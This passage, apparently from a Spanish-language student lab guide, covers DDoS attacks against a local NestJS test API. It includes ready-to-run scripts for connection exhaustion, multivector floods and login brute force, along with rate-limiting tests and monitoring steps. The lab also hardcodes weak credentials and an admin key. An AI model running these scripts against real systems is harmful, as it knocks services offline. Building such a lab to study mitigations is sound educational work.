HPING 127.0.0.1 (lo 127.0.0.1): UDP mode set, 40 headers + 0 data bytes
--- 127.0.0.1 hping statistic ---
50000 packets tramitted, 0 packets rcvd
```

### Métricas a Observar

- Incremento drástico de uso de red
- Paquetes perdidos
- CPU no necesariamente alto (el problema es red)

---

## 4.8 Connection Exhaustion

### Descripción del Ataque

El Connection Exhaustion abre tantas conexiones TCP como sea posible hasta agotar los file descriptors o el límite de conexiones del servidor.

### Capa del Modelo OSI

- **Capa 4**: Transporte (TCP)
- **Capa 3**: Red (IP)

### Capa Affected

- File descriptors
- TCP connections
- Memory

### Objetivo

- Agotar límites del sistema
- Crash del servidor
- Agotar memoria

### Cómo Ejecutarlo

#### Con Python:

```python
# connection_exhaustion.py
import socket
import time

target = "localhost"
port = 3000
max_connections = 10000

sockets = []
for i in range(max_connections):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"GET /api HTTP/1.1\r\nHost: localhost\r\n\r\n")
        sockets.append(s)
        if i % 100 == 0:
            print(f"Connections: {i}")
    except Exception as e:
        print(f"Failed at {i}: {e}")
        break

print(f"Total connections: {len(sockets)}")
time.sleep(300)  # Mantener conexiones
```

```bash
python3 connection_exhaustion.py
```

#### Con ulimit (ver límites):

```bash
# Ver límites actuales
ulimit -n

# Temporalmente aumentar (requiere permisos)
ulimit -n 65535
```

### Salida Esperada

```
Connections: 0
Connections: 100
Connections: 200
...
Total connections: 5000
Failed at 5234: [Errno 24] Too many open files
```

### En el servidor:

```bash
# Ver conexiones establecidas
ss -tan | grep :3000 | wc -l

# Ver límite de archivos abiertos
cat /proc/sys/fs/file-nr

# Ver errores en dmesg
dmesg | tail -20
```

---

## 4.9 Amplification Attack

### Descripción del Ataque

El Amplification Attack envía requests pequeñas que generan respuestas mucho mayores, amplificando el tráfico hacia la víctima.

### Capa del Modelo OSI

- **Capa 7**: Aplicación
- DNS, NTP, SNMP

### Capa Affected

- Bandwidth
- Servidor

### Objetivo

- Amplificar tráfico
- Saturar ancho de banda

### Cómo Ejecutarlo (Simulado)

En este laboratorio podemos simularlo con el endpoint `/api/items` que devuelve un array:

```bash
# Request pequeño -> respuesta grande (si hay muchos items)
# Primero creamos muchos items
for i in {1..1000}; do
  curl -s -X POST http://localhost:3000/api/items \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"item$i\",\"value\":$i}" > /dev/null
done

# Ahora el GET devuelve un array grande
wrk -t4 -c100 -d10s http://localhost:3000/api/items

# Comparar tamaño request vs response
# GET /api/items -> ~50KB de respuesta
```

### Salida Esperada - wrk

```
Running 10s test @ http://localhost:3000/api/items
  4 threads and 100 connections
  45234 requests in 10.00s
  4523.40 req/s
  Transfer/sec: 2.15MB  (respuestas grandes)
```

### Métricas a Observar

- **Transfer/sec** mucho mayor que en `/api/status`
- Ancho de banda consumido significativamente mayor

---

## 4.10 Multivector Attack (Ataque Combinado)

### Descripción del Ataque

El Multivector Attack combina múltiples vectores simultáneamente para maximizar el impacto.

### Capa del Modelo OSI

- Múltiples capas (3-7)
- Combinación de ataques

### Capa Affected

-Todos los niveles

###Objetivo

- Maximizar daño
- Crítico para el servidor

### Cómo Ejecutarlo

#### Script bash que combina ataques:

```bash
#!/bin/bash
# multi_attack.sh

echo "Starting multi-vector attack..."
echo "1. HTTP Flood en background"
wrk -t8 -c200 -d60s http://localhost:3000/api/status &
WRK_PID=$!

echo "2. Slowloris en background"
slowhttptest -c 500 -u http://localhost:3000/api -t GET -i 20 &
SLOW_PID=$!

echo "3. Connection exhaustion en background (solo Linux)"
python3 connection_exhaustion.py &
PY_PID=$!

echo "Waiting 60 seconds..."
sleep 60

kill $WRK_PID $SLOW_PID $PY_PID 2>/dev/null
echo "Attack finished"
```

```bash
chmod +x multi_attack.sh
./multi_attack.sh
```

### Salida Esperada

El servidor debería mostrar:
- Alta latencia en todos los endpoints
- Muchas conexiones en diferentes estados
- Posible caída del servicio
- Alto consumo de CPU y memoria

---

# SECCIÓN 5: PRUEBAS DE PROTECCIÓN

Esta sección contiene las pruebas Para verificar que los mecanismos de protección (rate limiting y bloqueo progresivo) funcionan correctamente.

---

## 5.1 Verificar que la API Funciona

### Objetivo

Confirmar que el servidor está ejecutándose y respondiendo correctamente.

### Ejecución

```bash
curl http://localhost:3000/api
```

### Salida Esperada

```
API DDoS Test Lab - Running
```

### Verificación adicional

```bash
# Ver estado completo
curl -s http://localhost:3000/api/status | jq .
```

### Salida JSON esperada

```json
{
  "status": "ok",
  "uptime": 125.45,
  "memory": {
    "rss": 45056000,
    "heapTotal": 12345678,
    "heapUsed": 8765432,
    "external": 123456
  },
  "requests": 156
}
```

---

## 5.2 Prueba de Login Correcto

### Objetivo

Verificar el proceso de autenticación con credenciales válidas.

### Ejecución

```bash
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password123"}'
```

### Salida Esperada

```json
{"success":true,"token":"jwt-token-simulado-1777942351522","message":"Login exitoso"}
```

### Significado de la respuesta

- **success: true**: Autenticación exitosa
- **token**: Token simulado (en producción sería JWT real)
- **message**: Mensaje de confirmación

---

## 5.3 Prueba de Login Incorrecto

### Objetivo

Verificar la respuesta del servidor ante credenciales inválidas.

### Ejecución

```bash
curl -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"WRONG"}'
```

### Salida Esperada

```json
{"message":"Credenciales inválidas","attemptsRemaining":3}
```

### Significado

- **message**: Indica que las credenciales no son válidas
- **attemptsRemaining**: Intentos restantes antes del bloqueo (3 en este caso)

---

## 5.4 Prueba de Múltiples Login Incorrectos

### Objetivo

Verificar el comportamiento del rate limiting y bloqueo progresivo bajo múltiples intentos fallidos.

### Ejecución

```bash
for i in 1 2 3 4 5 6 7; do
  echo "Intento $i:"
  curl -s -X POST http://localhost:3000/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"WRONG"}'
  echo ""
done
```

### Salida Esperada

```
Intento 1: {"message":"Credenciales inválidas","attemptsRemaining":3}
Intento 2: {"message":"Credenciales inválidas","attemptsRemaining":3}
Intento 3: {"statusCode":429,"message":"ThrottlerException: Too Many Requests"}
Intento 4: {"statusCode":429,"message":"ThrottlerException: Too Many Requests"}
Intento 5: {"statusCode":429,"message":"ThrottlerException: Too Many Requests"}
Intento 6: {"statusCode":429,"message":"ThrottlerException: Too Many Requests"}
Intento 7: {"statusCode":429,"message":"ThrottlerException: Too Many Requests"}
```

### Análisis

| Intento | Respuesta | Acción |
|---------|-----------|--------|
| 1 | 401 - Credenciales inválidas | Registra intento |
| 2 | 401 - Credenciales inválidas | Registra intento |
| 3 | 429 Too Many Requests | Bloqueado por rate limiting |
| 4-7 | 429 Too Many Requests | Rate limiting activo |

### Explicación técnica

- **Intentos 1-2**: Pasan a través de la autenticación pero fallan (credenciales inválidas)
- **Intento 3+**: El throttle de NestJS activa el límite de 5 requests/minuto
- El bloqueo progresivo en `blocked-ip.service.ts` no se activa porque el throttle actúa primero

---

## 5.5 Prueba de Rate Limiting Global

### Objetivo

Verificar el rate limiting global (100 requests/minuto por IP).

### Ejecución

```bash
for i in {1..10}; do curl -s -o /dev/null -w "%{http_code} " http://localhost:3000/api/status; done
echo ""
```

### Salida Esperada

```
200 200 200 200 200 429 429 429 429 429
```

### Análisis

- **Primeros 5 requests**: 200 OK (respuesta exitosa)
- **Siguientes 5 requests**: 429 Too Many Requests (bloqueados por throttle)

### Explicación técnica

El rate limiting global está configurado en `app.module.ts`:
- `ttl: 60000` (60,000 ms = 1 minuto)
- `limit: 100` (máximo 100 requests por minuto)

---

## 5.6 Ver Estado de Bloqueo

### Objetivo

Consultar el estado de bloqueo de tu dirección IP.

### Ejecución

```bash
curl http://localhost:3000/auth/status
```

### Salida Esperada (NO bloqueado)

```json
{"ip":"::1","blocked":false}
```

### Salida Esperada (BLOQUEADO)

```json
{"ip":"::1","blocked":true,"retryAfterSeconds":45}
```

### Significado de campos

| Campo | Descripción |
|-------|-------------|
| ip | Tu dirección IP |
| blocked | true/false indicando si está bloqueada |
| retryAfterSeconds | Segundos restantes hasta desbloqueo |

---

## 5.7 Ver Logs de Intentos

### Objetivo

Acceder al log de intentos de autenticación (requiere clave de admin).

### Ejecución

```bash
curl -H "x-admin-key: admin-secret" http://localhost:3000/auth/logs
```

### Salida Esperada

```json
{
  "logs": [
    {"ip":"::1","endpoint":"/auth/login","timestamp":"2026-05-06T10:30:00.000Z","success":false},
    {"ip":"::1","endpoint":"/auth/login","timestamp":"2026-05-06T10:30:01.000Z","success":false},
    ...
  ],
  "blockedIPs": [
    {"ip":"::1","attempts":5,"retryAfterSeconds":300}
  ]
}
```

### Descripción de campos

| Campo | Descripción |
|-------|-------------|
| ip | Dirección IP del cliente |
| endpoint | Endpoint accedido |
| timestamp | Cuándo ocurrió |
| success | Si el intento fue exitoso |
| attempts | Número de intentos fallidos |
| retryAfterSeconds | Tiempo restante de bloqueo |

---

# SECCIÓN 6: MONITOREO EN VIVO

## 6.1 Monitoreo de CPU y Memoria

### Terminal 2: htop (Linux)

```bash
htop
```

### Alternativas

```bash
# top básico
top

# Ver proceso Node.js específico
ps aux | grep node

# Ver CPU de proceso específico
top -p $(pgrep -f "node dist/main.js")
```

### PowerShell (Windows)

```powershell
# Ver procesos Node.js
Get-Process -Name node | Format-Table CPU, WorkingSet64, Handles -AutoSize

# Monitoreo continuo
while ($true) {
    Get-Process -Name node | Select-Object CPU, WorkingSet64, Handles
    Start-Sleep -Seconds 2
    Clear-Host
}
```

---

## 6.2 Monitoreo de Conexiones

### Linux

```bash
# Ver todas las conexiones al puerto 3000
ss -tan | grep :3000

# Contar conexiones
ss -tan | grep :3000 | wc -l

# Ver estados específicos
ss -tan | grep :3000 | grep ESTA

# Ver en tiempo real
watch -n 1 'ss -tan | grep :3000 | head -20'
```

### Windows PowerShell

```powershell
# Ver conexiones TCP al puerto
Get-NetTCPConnection -LocalPort 3000

# Contar conexiones
(Get-NetTCPConnection -LocalPort 3000).Count

# Ver por estado
Get-NetTCPConnection -LocalPort 3000 | Select-Object State, OwningProcess
```

---

## 6.3 Monitoreo de la API

### Linux

```bash
# Ver estado cada segundo
watch -n 1 'curl -s http://localhost:3000/api/status | jq .'

# Ver uptime
curl -s http://localhost:3000/api/status

# Ver logs de seguridad
curl -s -H "x-admin-key: admin-secret" http://localhost:3000/auth/logs | jq .
```

### Windows PowerShell

```powershell
# Ver estado en bucle
while ($true) {
    Invoke-RestMethod -Uri "http://localhost:3000/api/status"
    Start-Sleep -Seconds 1
    Clear-Host
}
```

---

# SECCIÓN 7: SCRIPTS DE ATAQUE

Esta sección contiene scripts predefinidos Para facilitar la ejecución de ataques de prueba.

---

## 7.1 ataque-login.sh

### Descripción

Script para simular ataque específico al endpoint de login con múltiples intentos fallidos.

### Ubicación

`scripts/ataque-login.sh`

### Contenido

```bash
#!/bin/bash

# ==========================================
# PARTE 3 - Simulación de Ataque DDoS
# ==========================================

echo "=========================================="
echo "Simulación de Ataque al Endpoint /auth/login"
echo "=========================================="

API_URL="${API_URL:-http://localhost:3000}"
TOTAL_REQUEST=${1:-20}  # Por defecto 20 intentos

echo "URL: $API_URL"
echo "Total de intentos: $TOTAL_REQUEST"
echo ""

# Función para hacer login fallido
intento_fallido() {
    local attempt=$1
    local response=$(curl -s -w "\n%{http_code}" -X POST "$API_URL/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"wrongpass"}')
    
    local http_code=$(echo "$response" | tail -1)
    local body=$(echo "$response" | head -n -1)
    
    echo "[$attempt] HTTP $http_code"
}

echo "Iniciando ataques..."
echo ""

# Ejecutar ataques consecutivos
for i in $(seq 1 $TOTAL_REQUEST); do
    intento_fallido $i
    sleep 0.1  # Pequeña pausa para no saturar la red local
done

echo ""
echo "=========================================="
echo "Ataque completado. Verificar estado:"
echo " curl http://localhost:3000/auth/status"
echo " curl http://localhost:3000/auth/logs"
echo "=========================================="
```

### Uso

```bash
# Ejecutar con número personalizado
./scripts/ataque-login.sh 10

# Ejecutar con valor por defecto (20 intentos)
./scripts/ataque-login.sh

# Especificar URL personalizada
API_URL=http://localhost:3000 ./scripts/ataque-login.sh 15
```

### Salida Esperada

```
==========================================
Simulación de Ataque al Endpoint /auth/login
==========================================
URL: http://localhost:3000
Total de intentos: 10
==========================================

Iniciando ataques...

[1] HTTP 401
[2] HTTP 401
[3] HTTP 401
[4] HTTP 429
[5] HTTP 429
[6] HTTP 429
[7] HTTP 429
[8] HTTP 429
[9] HTTP 429
[10] HTTP 429

==========================================
Ataque completado. Verificar estado:
 curl http://localhost:3000/auth/status
 curl http://localhost:3000/auth/logs
==========================================
```

---

## 7.2 ataque-global.sh

### Descripción

Script completo de prueba de carga que simula un ataque DDoS real con múltiples vectores.

### Ubicación

`scripts/ataque-global.sh`

### Contenido

```bash
#!/bin/bash

# ==========================================
# Script de prueba de carga - wrk simulation
# Simula ataque DDoS con múltiples endpoints
# ==========================================

API_URL="${API_URL:-http://localhost:3000}"

echo "=========================================="
echo "Prueba de carga - Simulación DDoS"
echo "=========================================="

# Verificar que la API esté corriendo
echo "Verificando que la API esté disponible..."
if ! curl -s --max-time 2 "$API_URL/api/status" > /dev/null; then
    echo "ERROR: La API no está disponible en $API_URL"
    echo "Ejecutar: cd api-test-ddos && npm run start:dev"
    exit 1
fi

echo "✓ API disponible"
echo ""

#ATAQUE 1: Login fallidos consecutivamente
echo ">>> ATAQUE 1: Login fallidos consecutivamente..."
for i in {1..10}; do
    curl -s -X POST "$API_URL/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"hacker","password":"wrong"}' > /dev/null
    echo -n "."
done
echo " ✓ 10 intentos de login"

sleep 2

#ATAQUE 2: Múltiples requests al endpoint /api/status
echo ""
echo ">>> ATAQUE 2: Requests masivos a /api/status..."
for i in {1..50}; do
    curl -s "$API_URL/api/status" > /dev/null &
done
wait
echo " ✓ 50 requests en paralelo a /api/status"

sleep 1

#ATAQUE 3: Endpoints variados
echo ""
echo ">>> ATAQUE 3: Requests a múltiples endpoints..."
endpoints=("/api/items" "/api/heavy" "/api/status" "/api/delay/100")
for endpoint in "${endpoints[@]}"; do
    for i in {1..10}; do
        curl -s "$API_URL$endpoint" > /dev/null &
    done
done
wait
echo " ✓ Ataque a múltiples endpoints"

sleep 2

# Verificar estado
echo ""
echo "=========================================="
echo "RESULTADOS DEL ATAQUE:"
echo "=========================================="
echo ""
echo "--- Estado de bloqueo de tu IP ---"
curl -s "$API_URL/auth/status" | jq .
echo ""
echo "--- IPs bloqueadas actualmente ---"
curl -s -H "x-admin-key: admin-secret" "$API_URL/auth/logs" | jq '.blockedIPs'
echo ""
echo "--- Últimos logs ---"
curl -s -H "x-admin-key: admin-secret" "$API_URL/auth/logs" | jq '.logs | length' | xargs -I {} echo "Total de logs: {}"
```

### Uso

```bash
# Ejecutar script
./scripts/ataque-global.sh

# Con URL personalizada
API_URL=http://192.168.1.100:3000 ./scripts/ataque-global.sh
```

### Salida Esperada

```
==========================================
Prueba de carga - Simulación DDoS
==========================================
Verificando que la API esté disponible...
✓ API disponible

>>> ATAQUE 1: Login fallidos consecutivamente...
.......... ✓ 10 intentos de login
>>> ATAQUE 2: Requests masivos a /api/status...
 ✓ 50 requests en paralelo a /api/status
>>> ATAQUE 3: Requests a múltiples endpoints...
 ✓ Ataque a múltiples endpoints
==========================================
RESULTADOS DEL ATAQUE:
==========================================

--- Estado de bloqueo de tu IP ---
{
  "ip": "::1",
  "blocked": true,
  "retryAfterSeconds": 300
}
--- IPs bloqueadas actualmente ---
[
  {
    "ip": "::1",
    "attempts": 10,
    "retryAfterSeconds": 300
  }
]
--- Últimos logs ---
Total de logs: 70
```

---

## 7.3 Ejecución de Scripts

### Permisos de Ejecución

```bash
# Dar permisos de ejecución
chmod +x scripts/ataque-login.sh
chmod +x scripts/ataque-global.sh
```

### Desde cualquier ubicación

```bash
# Agregar al PATH (opcional)
export PATH="$PATH:/home/adrian/Escritorio/REPOSITORIOS/apiTestDDos/scripts"

# Ahora ejecutar desde cualquier lado
ataque-login.sh 10
ataque-global.sh
```

### Windows PowerShell - Equivalente

```powershell
# Ejecutar bucle manualmente
1..20 | ForEach-Object {
    $response = Invoke-WebRequest -Uri "http://localhost:3000/auth/login" -Method POST -Body (@{username="admin"; password="wrong"} | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing
    Write-Host "[$_] HTTP $($response.StatusCode)"
    Start-Sleep -Milliseconds 100
}
```

---

# SECCIÓN 8: INTERPRETACIÓN DE RESULTADOS

## 8.1 Interpretación wrk

### Métricas Clave

```
Running 30s test @ http://localhost:3000/api/status
  12 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/-Stdev
    Latency     45.23ms   12.34ms  98.45ms   76.00%
    Req/Sec    892.45     45.67  1200.00    72.00%
  267823 requests in 30.02s, 45.67MB read
Requests/sec:   8923.45
Transfer/sec:     1.52MB

Latency distribution:
    50%   42.00ms
    75%   58.00ms
    90%   72.00ms
    99%   98.45ms
```

### Análisis

| Métrica | Ideal | Advertencia | Peligro |
|--------|-------|-------------|----------|
| Stdev | < 15ms | 15-30ms | > 30ms |
| Requests/sec | > 5000 | 1000-5000 | < 1000 |
| Latencia 99% | < 100ms | 100-500ms | > 500ms |

---

## 8.2 Interpretación Apache Bench

### Ejemplo

```
Complete requests:      10000
Failed requests:        45
Non-2xx responses:      10
Requests per second:    523.45
Time per request:       382.12ms
Transfer rate:         145.23 KB/s received
```

### Análisis

- **Failed requests > 0**: El servidor está saturado
- **Non-2xx responses**: Errores HTTP (4xx, 5xx)
- **Time per request**: Tiempo promedio por request

---

## 8.3 Interpretación autocannon

### Ejemplo

```
Stat        Avg      Stdev    Max
Latency:   23.45ms   12.34ms 456.78ms
Req/Sec:   423.45    67.89   567.00
Req/Bytes: 15.23     4.56    23.00

Seconds: 30.02
Count:   12678
```

### Análisis

- **Req/Sec**: Requests por segundo
- **Latency**: Tiempo de respuesta
- **Stdev**: Variabilidad (más bajo = mejor)

---

## 8.4 Interpretación slowhttptest

### Ejemplo

```
connected: 850/1000
pending:   145
complete:   5
socket errors: 0
```

### Análisis

- **connected**: Conexiones activas (mantiene alto = ataque working)
- **pending**: Conexiones esperando datos
- **socket errors**: Errores de conexión (aumenta = límite alcanzado)

---

## 8.5 Interpretación hping3 (SYN Flood)

### Ejemplo

```
--- 127.0.0.1 hping statistic ---
157834 packets tramitted, 0 packets rcvd, 100% packet loss
--- 0.000000% packet loss, time 2345ms
```

### Análisis

- **100% packet loss en localhost**: Normal (loopback)
- **En red real**: packet loss indica saturación

---

# SECCIÓN 9: MATRIZ COMPARATIVA ATAQUES VS HERRAMIENTAS

## Tabla Comparativa

| Tipo de Ataque | Herramienta | Capa OSI | Complejidad | Efectividad | Detección |
|---------------|------------|----------|-------------|-------------|------------|
| HTTP Flood (GET) | wrk, ab, autocannon | C7 | Baja | Alta | Difícil |
| POST Flood | ab, wrk+lua | C7 | Media | Alta | Media |
| CPU Exhaustion | wrk+heavy | C7 | Baja | Alta | Fácil |
| Slowloris | slowhttptest, curl | C7 | Media | Media-Alta | Media |
| Slow POST | slowhttptest | C7 | Media | Media-Alta | Media |
| SYN Flood | hping3 | C3-C4 | Alta | Muy Alta | Difícil |
| UDP Flood | hping3 | C3-C4 | Alta | Muy Alta | Difícil |
| Connection Exhaustion | Python, curl | C4 | Media | Muy Alta | Media |
| Amplification | curl+items | C7 | Baja | Media | Fácil |
| Multivector | Múltiples | C3-C7 | Alta | Crítica | Muy difícil |

---

# SECCIÓN 10: RECOMENDACIONES Y NOTAS

## 10.1 Recomendaciones para Pruebas

1. **Empezá suave**: 100 conexiones, 10 segundos
2. **Aumentá gradualmente**: 500 conexiones, 30 segundos
3. **Proabá cada tipo**: Entendé cómo afecta cada ataque
4. **Monitoreá siempre**: CPU, memoria, red, conexiones
5. **Documentá resultados**: Compará antes/después de cambios
6. **Probá mitigaciones**: Agregá rate limiting, filtros, etc.
7. **Variá parámetros**: Más duración, más conexiones, más objetivos

---

## 10.2 Notas de Seguridad

⚠️ **ADVERTENCIA FINAL**: Esta API está diseñada exclusivamente para entornos de laboratorio controlados. No debe desplegarse en producción sin medidas de seguridad adicionales.

**Limitaciones conocidas:**
- Sin autenticación en endpoints de prueba
- Sin rate limiting avanzado (solo en /auth/login)
- Sin validación de entrada exhaustiva
- Datos en memoria (se pierden al reiniciar)

**Para producción, considerar:**
- Implementar JWT completo
- Usar Redis para persistencia
- Agregar WAF (Cloudflare)
- Implementar CAPTCHA
- Logging avanzado
- Métricas Prometheus/Grafana

---

*Documento creado para el proyecto de Laboratorio de DDoS -*
*Última actualización: Mayo 2026*
*Guía diseñada para uso académico y de investigación*
*Autor: Burdiles Ricardo Adrián. Estudiante de ITS Cipolletti.
*Materia: Prácticas III 3° año
*Profesor: Aqueveque Roberto